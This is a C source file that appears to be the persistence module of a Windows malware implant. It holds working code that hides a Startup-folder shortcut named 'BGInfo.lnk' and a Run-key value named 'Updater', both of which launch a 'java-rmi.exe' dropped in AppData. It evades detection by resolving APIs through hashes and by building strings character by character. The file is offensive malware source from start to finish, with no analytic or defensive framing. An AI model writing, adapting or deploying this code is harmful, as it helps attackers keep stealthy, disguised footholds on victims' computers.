#include "Persist.h"
#include "Structs.h"
#include "ApiHashing.h"
#include "Core.h"

#include <Windows.h>
#include <shobjidl.h>
#include <shlguid.h>
#include <objbase.h>
#include <shlobj_core.h>
#include <stdio.h>
#include <shlwapi.h>

#define COMBASE_H                   0xC4FA1109
#define CoInitializeEx_H            0xCE0DA2C1
#define CoCreateInstance_H          0x4830B481
#define CoUninitialize_H            0xEC1A148A
#define CoTaskMemFree_H             0x3B1FAF31

#define SHELL32DLL_H                0x04532CD4
#define SHGetKnownFolderPath_H      0x6466C634

#define KERNEL32DLL_H				0x377D97D5
#define GetEnvironmentVariableW_H   0x72A42C18
#define GetFileAttributesW_H        0xD3E53030

#define ADVAPI32DLL_H               0xACF5DF37
#define RegOpenKeyExW_H             0x39F6227E
#define RegSetValueExW_H            0x0FDEB812
#define WriteToRegKeyW_H            0xD9F3700B
#define RegCloseKey_H               0x8E8780DD

BOOL CreateShortcut(LPCWSTR ExePath, LPCWSTR Arguments, LPCWSTR LnkPath) 
{

    HMODULE hComBase = GetModuleHandleH(COMBASE_H);
    fnCoInitializeEx pCoInitializeEx = (fnCoInitializeEx)GetProcAddressH(hComBase, CoInitializeEx_H);
    fnCoCreateInstance pCoCreateInstance = (fnCoCreateInstance)GetProcAddressH(hComBase, CoCreateInstance_H);
    fnCoUninitialize pCoUninitialize = (fnCoUninitialize)GetProcAddressH(hComBase, CoUninitialize_H);
    fnCoTaskMemFree pCoTaskMemFree= (fnCoTaskMemFree)GetProcAddressH(hComBase, CoTaskMemFree_H);

    HRESULT hr;
    IShellLinkW* pShellLink = NULL;
    IPersistFile* pPersistFile = NULL;
    BOOL result = FALSE;

    hr = pCoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        return FALSE;
    }

    hr = pCoCreateInstance(&CLSID_ShellLink, NULL, CLSCTX_ALL, &IID_IShellLinkW, (void**)&pShellLink);
    if (FAILED(hr)) {
        goto Cleanup;
    }

    hr = pShellLink->lpVtbl->SetPath(pShellLink, ExePath);
    if (FAILED(hr)) {
        goto Cleanup;
    }

    hr = pShellLink->lpVtbl->SetShowCmd(pShellLink, SW_SHOWMINNOACTIVE);  
    if (FAILED(hr)) {
        goto Cleanup;
    }

    hr = pShellLink->lpVtbl->SetArguments(pShellLink, Arguments);
    if (FAILED(hr)) {
        goto Cleanup;
    }

    hr = pShellLink->lpVtbl->QueryInterface(pShellLink, &IID_IPersistFile, (void**)&pPersistFile);
    if (FAILED(hr)) {
        goto Cleanup;
    }

    hr = pPersistFile->lpVtbl->Save(pPersistFile, LnkPath, TRUE);
    if (FAILED(hr)) {
        goto Cleanup;
    }
    
    result = TRUE;

Cleanup:
    if (pPersistFile) {
        pPersistFile->lpVtbl->Release(pPersistFile);
    }
    if (pShellLink) {
        pShellLink->lpVtbl->Release(pShellLink);
    }
    pCoUninitialize();
    return result;
}
BOOL PersistViaStartup()
{
    wchar_t cShell32Dll[] = {L'S', L'H', L'E', L'L', L'L', L'3', L'2', L'.', L'D', L'L', L'L', L'\0'};
    wchar_t cCombaseDll[] = { L'C', L'O', L'M', L'B', L'A', L'S', L'E', L'.', L'D', L'L', L'L', L'\0' };

    if (!LdrLoadDll(cShell32Dll) || !LdrLoadDll(cCombaseDll)) {
        return FALSE;
    }

    HMODULE hKernel32Base = GetModuleHandleH(KERNEL32DLL_H);
    HMODULE hShell32Base = GetModuleHandleH(SHELL32DLL_H);
    HMODULE hComBase = GetModuleHandleH(COMBASE_H);
    if (hKernel32Base == NULL || hShell32Base == NULL || hComBase == NULL) {
        return FALSE;
    }

    fnSHGetKnownFolderPath pSHGetKnownFolderPath = (fnSHGetKnownFolderPath)GetProcAddressH(hShell32Base, SHGetKnownFolderPath_H);
    fnGetEnvironmentVariableW pGetEnvironmentVariableW = (fnGetEnvironmentVariableW)GetProcAddressH(hKernel32Base, GetEnvironmentVariableW_H);     
    fnCoTaskMemFree pCoTaskMemFree = (fnCoTaskMemFree)GetProcAddressH(hComBase, CoTaskMemFree_H);
    fnGetFileAttributesW pGetFileAttributesW = (fnGetFileAttributesW)GetProcAddressH(hKernel32Base, GetFileAttributesW_H);
    if (pSHGetKnownFolderPath == NULL || pGetEnvironmentVariableW == NULL || pCoTaskMemFree == NULL || pGetFileAttributesW == NULL) {
        return FALSE;
    }

    WCHAR userProfile[MAX_PATH];
    wchar_t cUserProfile[] = { L'U', L'S', L'E', L'R', L'P', L'R', L'O', L'F', L'I', L'L', L'E', L'\0' };

    DWORD size = pGetEnvironmentVariableW(cUserProfile, userProfile, MAX_PATH);
    if (size == 0 || size > MAX_PATH) {
        return FALSE;
    }

    WCHAR exePath[MAX_PATH];
    _wcscpy(exePath, userProfile); 

    wchar_t cAppData[] = { L'\\', L'A', L'p', L'p', L'D', L'a', L't', L'a', L'\\', L'L', L'o', L'c', L'a', L'l', L'\\', L'j', L'a', L'v', L'a', L'-', L'r', L'm', L'i', L'.', L'e', L'x', L'e', L'\0' };
    if (_wcslen(exePath) + _wcslen(cAppData) + 1 > MAX_PATH) {
        return FALSE;
    }
    wcscat(exePath, cAppData);

    PWSTR startupPath = NULL;
    HRESULT hr = pSHGetKnownFolderPath(&FOLDERID_Startup, 0, NULL, &startupPath);
    if (FAILED(hr)) {
        return FALSE;
    }

    WCHAR lnkPath[MAX_PATH];
    _wcscpy(lnkPath, startupPath); 

    wchar_t cBginfo[] = { L'\\', L'B', L'G', L'I', L'n', L'f', L'o', L'.', L'l', L'n', L'k', L'\0'};

    if (_wcslen(lnkPath) + _wcslen(cBginfo) + 1 > MAX_PATH) {
        pCoTaskMemFree(startupPath);
        return FALSE; 
    }
    wcscat(lnkPath, cBginfo); 

    DWORD dwFilecheck = pGetFileAttributesW(lnkPath);
    if (dwFilecheck != INVALID_FILE_ATTRIBUTES && !(dwFilecheck & FILE_ATTRIBUTE_DIRECTORY)) {
        pCoTaskMemFree(startupPath);
        return TRUE;
    }

    if (!CreateShortcut(exePath, L"", lnkPath)) {
        pCoTaskMemFree(startupPath);
        return FALSE;
    }

    pCoTaskMemFree(startupPath);
    return TRUE;
}

BOOL WriteToRegKeyW(IN HKEY hKey, IN LPCWSTR szSubKey, IN LPCWSTR szRegName, IN PBYTE pRegData, IN DWORD dwDataSize)
{

    HKEY hkResult = NULL;
    BOOL bResult = FALSE;
    LSTATUS STATUS = 0x00;

    if (!hKey || !szSubKey || !szRegName || !pRegData || !dwDataSize) {
        return FALSE;
    }

    wchar_t cAdvapi32Dll[] = { L'A', L'D', L'V', L'A', L'P', L'I', L'3', L'2', L'.', L'D', L'L', L'L', L'\0'};
    if (!LdrLoadDll(cAdvapi32Dll)) {
        return FALSE;
    }

    HMODULE hAdvapi32Base = GetModuleHandleH(ADVAPI32DLL_H);
    fnRegOpenKeyExW pRegOpenKeyExW = (fnRegOpenKeyExW)GetProcAddressH(hAdvapi32Base, RegOpenKeyExW_H);

    if ((STATUS = pRegOpenKeyExW(hKey, szSubKey, 0x00, KEY_WRITE, &hkResult)) != ERROR_SUCCESS) {
        return FALSE;
    }


    fnRegSetValueExW pRegSetValueExW = (fnRegSetValueExW)GetProcAddressH(hAdvapi32Base, RegSetValueExW_H);
    fnRegCloseKey pRegCloseKey = (fnRegCloseKey)GetProcAddressH(hAdvapi32Base, RegCloseKey_H);


    if (!pRegSetValueExW || !pRegCloseKey) {
        return FALSE;
    }

    if ((STATUS = pRegSetValueExW(hkResult, szRegName, 0x00, REG_SZ, pRegData, dwDataSize)) != ERROR_SUCCESS) {
        pRegCloseKey(hkResult);
        return FALSE;
    }

    pRegCloseKey(hkResult);
    return TRUE;
}

BOOL PersistViaRegKey()
{
    wchar_t cShell32Dll[] = { L'S', L'H', L'E', L'L', L'L', L'3', L'2', L'.', L'D', L'L', L'L', L'\0' };
    wchar_t cKernel32Dll[] = { L'K', L'E', L'R', L'N', L'E', L'L', L'3', L'2', L'.', L'D', L'L', L'L', L'\0'};

    if (!LdrLoadDll(cShell32Dll) || !LdrLoadDll(cKernel32Dll)) {
        return FALSE;
    }

    HMODULE hKernel32Base = GetModuleHandleH(KERNEL32DLL_H);
    HMODULE hShell32Base = GetModuleHandleH(SHELL32DLL_H);

    if (hKernel32Base == NULL || hShell32Base == NULL) {
        return FALSE;
    }

    fnSHGetKnownFolderPath pSHGetKnownFolderPath = (fnSHGetKnownFolderPath)GetProcAddressH(hShell32Base, SHGetKnownFolderPath_H);
    fnGetEnvironmentVariableW pGetEnvironmentVariableW = (fnGetEnvironmentVariableW)GetProcAddressH(hKernel32Base, GetEnvironmentVariableW_H);

    if (!pSHGetKnownFolderPath || !pGetEnvironmentVariableW) {
        return FALSE;
    }

    WCHAR userProfile[MAX_PATH];
    wchar_t cUserProfile[] = { L'U', L'S', L'E', L'R', L'P', L'R', L'O', L'F', L'I', L'L', L'E', L'\0' };

    DWORD size = pGetEnvironmentVariableW(cUserProfile, userProfile, MAX_PATH);
    if (size == 0 || size > MAX_PATH) {
        return FALSE;
    }

    WCHAR exePath[MAX_PATH];
    _wcscpy(exePath, userProfile); 

    wchar_t cAppData[] = {L'\\', L'A', L'p', L'p', L'D', L'a', L't', L'a', L'\\', L'L', L'o', L'c', L'a', L'l', L'\\', L'j', L'a', L'v', L'a', L'-', L'r', L'm', L'i', L'.', L'e', L'x', L'e', L'\0'};
    if (_wcslen(exePath) + _wcslen(cAppData) + 1 > MAX_PATH) { 
        return FALSE;  
    }
    wcscat(exePath, cAppData);  

    wchar_t cHkcu[] = {L'S', L'o', L'f', L't', L'w', L'a', L'r', L'e', L'\\', L'M', L'i', L'c', L'r', L'o', L's', L'o', L'f', L't', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\', L'C', L'u', L'r', L'r', L'e', L'n', L't', L'V', L'e', L'r', L's', L'i', L'o', L'n', L'\\', L'R', L'u', L'n', L'\0'};
    wchar_t cUpdater[] = { L'U', L'p', L'd', L'a', L't', L'e', L'r', L'\0' };

    if (!WriteToRegKeyW(HKEY_CURRENT_USER, cHkcu, cUpdater, (PBYTE)exePath, (DWORD)((_wcslen(exePath) + 1) * sizeof(WCHAR)))) {
        return FALSE;
    }

    return TRUE;
}